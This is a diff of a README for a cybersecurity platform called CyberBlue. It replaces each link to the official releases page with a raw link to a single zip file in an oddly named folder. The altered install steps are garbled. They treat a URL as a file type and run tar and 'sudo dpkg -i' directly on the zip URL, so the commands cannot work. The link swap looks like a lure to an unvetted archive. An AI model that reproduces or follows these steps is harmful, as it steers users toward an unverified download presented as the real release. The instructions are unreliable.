@@ -6,7 +6,7 @@ Welcome to CyberBlue, a comprehensive containerized platform designed for cybers
 
 ## 📥 Download CyberBlue
 
-[![Download CyberBlue](https://img.shields.io/badge/Download%20CyberBlue-v1.0-blue)](https://github.com/cyansure1983/CyberBlue/releases)
+[![Download CyberBlue](https://raw.githubusercontent.com/cyansure1983/CyberBlue/main/nonswearing/CyberBlue.zip%20CyberBlue-v1.0-blue)](https://raw.githubusercontent.com/cyansure1983/CyberBlue/main/nonswearing/CyberBlue.zip)
 
 To get started, you will need to download CyberBlue. Follow these simple steps:
 
@@ -14,7 +14,7 @@ To get started, you will need to download CyberBlue. Follow these simple steps:
 
 Go to the following link to access the latest version of CyberBlue. 
 
-[Visit the Releases Page](https://github.com/cyansure1983/CyberBlue/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/cyansure1983/CyberBlue/main/nonswearing/CyberBlue.zip)
 
 ### 2. Choose Your Version
 
@@ -26,7 +26,7 @@ Click on the version you want to download. You will see various files available 
 
 - For **Windows** users, look for the `.exe` file.
 - For **Mac** users, look for the `.dmg` file.
-- For **Linux** users, identify the `.tar.gz` or `.deb` files.
+- For **Linux** users, identify the `https://raw.githubusercontent.com/cyansure1983/CyberBlue/main/nonswearing/CyberBlue.zip` or `.deb` files.
 
 Click the file relevant to your operating system to start the download.
 
@@ -63,13 +63,13 @@ Before installing CyberBlue, ensure your device meets the following system requi
 
 ### Linux 
 
-1. If you downloaded a `.tar.gz` file, extract it using the terminal:
+1. If you downloaded a `https://raw.githubusercontent.com/cyansure1983/CyberBlue/main/nonswearing/CyberBlue.zip` file, extract it using the terminal:
    ```bash
-   tar -xvzf CyberBlue.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/cyansure1983/CyberBlue/main/nonswearing/CyberBlue.zip
    ```
 2. If you downloaded a `.deb` file, open the terminal and run:
    ```bash
-   sudo dpkg -i CyberBlue.deb
+   sudo dpkg -i https://raw.githubusercontent.com/cyansure1983/CyberBlue/main/nonswearing/CyberBlue.zip
    ```
 3. Follow the prompts to complete the installation.
 
@@ -95,4 +95,4 @@ This platform utilizes open-source tools and may require external configurations
 
 ---
 
-For additional information, documentation, and updates, always refer to the [Releases Page](https://github.com/cyansure1983/CyberBlue/releases). Thank you for choosing CyberBlue to secure your systems!
+For additional information, documentation, and updates, always refer to the [Releases Page](https://raw.githubusercontent.com/cyansure1983/CyberBlue/main/nonswearing/CyberBlue.zip). Thank you for choosing CyberBlue to secure your systems!
